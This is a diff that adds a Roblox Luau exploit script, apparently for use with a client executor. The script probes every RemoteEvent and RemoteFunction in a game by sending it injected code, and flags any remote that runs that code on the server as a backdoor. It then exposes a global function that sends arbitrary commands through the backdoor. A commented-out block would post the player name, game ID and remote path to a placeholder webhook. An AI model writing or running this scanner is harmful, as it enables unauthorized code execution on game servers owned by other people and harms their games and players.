@@ -1,0 +1,96 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0'}
+local backdoor = nil
+
+local function randStr(len)
+    local s = ""
+    for i = 1, len do
+        s = s .. alphabet[math.random(#alphabet)]
+    end
+    return s
+end
+
+local function fire(remote, data)
+    if not remote or not remote.Parent then return end
+    pcall(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(data)
+        elseif remote:IsA("RemoteFunction") then
+            spawn(function() remote:InvokeServer(data) end)
+        end
+    end)
+end
+
+local function testRemote(remote)
+    local code = randStr(24)
+    local canary = "Shkalifa_" .. code
+
+    fire(remote, "game.Lighting:FindFirstChild('"..canary.."') or Instance.new('Folder', game.Lighting).Name='"..canary.."'")
+
+    for i = 1, 3 do
+        task.wait()
+        if game.Lighting:FindFirstChild(canary) or game.ServerStorage:FindFirstChild(canary) then
+            backdoor = remote
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Backdoor Found",
+                Text = remote:GetFullName() .. " (High Pop)",
+                Duration = 8
+            })
+
+            -- Log opcional (desactivar en uso real)
+            -- pcall(function()
+            --     syn.request({
+            --         Url = "YOUR_WEBHOOK",
+            --         Method = "POST",
+            --         Headers = {["Content-Type"] = "application/json"},
+            --         Body = HttpService:JSONEncode({
+            --             content = "**HIGH POP BACKDOOR**\nUser: "..Players.LocalPlayer.Name.."\nGame: "..game.PlaceId.."\nRemote: "..remote:GetFullName()
+            --         })
+            --     })
+            -- end)
+
+            return true
+        end
+    end
+end
+
+
+local scanned = {}
+local function scan()
+    for _, obj in ipairs(game:GetDescendants()) do
+        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not scanned[obj] then
+            scanned[obj] = true
+
+            
+            local path = obj:GetFullName()
+            if string.find(path, "RobloxReplicatedStorage") or
+               string.find(path, "DefaultChatSystem") or
+               string.find(path, "HDAdmin") or
+               string.find(path, "Adonis") then
+                continue
+            end
+
+            spawn(function()
+                testRemote(obj)
+            end)
+        end
+    end
+end
+
+scan()
+game.DescendantAdded:Connect(function(obj)
+    if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not scanned[obj] then
+        task.wait(0.5)
+        testRemote(obj)
+    end
+end)
+
+_G.ExecuteShkalifa = function(cmd)
+    if backdoor then
+        cmd = string.gsub(cmd, "%%username%%", Players.LocalPlayer.Name)
+        fire(backdoor, cmd)
+    end
+end
